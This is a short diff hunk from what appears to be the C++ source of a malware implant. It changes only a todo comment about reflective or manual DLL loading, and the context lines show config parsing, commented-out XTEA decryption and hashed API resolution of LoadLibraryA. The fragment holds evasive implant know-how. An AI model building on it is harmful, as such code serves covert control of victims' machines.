@@ -142,7 +142,7 @@ namespace Implant {
         Parser::ParserStrcpy(&parser, &Ctx->config.hostname, nullptr);
 
         //Xtea::XteaCrypt(B_PTR(Parser.Buffer), Parser.Length - 0x12, Ctx->config.Key, FALSE);
-        // todo: add ReflectLoadLibrary: https://github.com/bats3c/DarkLoadLibrary
+        // todo: add dll manual mapping: https://github.com/bats3c/DarkLoadLibrary
 
         if ((F_PTR_HMOD(Ctx->win32.LoadLibraryA, Ctx->modules.kernel32, LOADLIBRARYA))) {
             x_assertb(Ctx->modules.crypt32  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&parser, nullptr)));
